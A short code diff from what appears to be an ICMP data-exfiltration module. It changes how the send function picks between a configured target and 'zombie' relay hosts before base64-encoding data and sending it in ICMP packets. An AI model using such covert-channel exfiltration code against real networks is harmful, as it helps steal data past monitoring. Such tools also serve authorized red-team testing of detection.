@@ -28,9 +28,12 @@ def send_icmp(dst, data):
     s.close()
 
 def send(data):
-    targets = [config['target']] + config['zombies']
+    if config.has_key('zombies') and config['zombies'] != [""]:
+        targets = [config['target']] + config['zombies']
+        target = choice(targets)
+    else:
+        target = config['target']
     data = base64.b64encode(data)
-    target = choice(targets)
     app_exfiltrate.log_message(
         'info', "[icmp] Sending {0} bytes with ICMP packet to {1}".format(len(data), target))
     send_icmp(target, data)
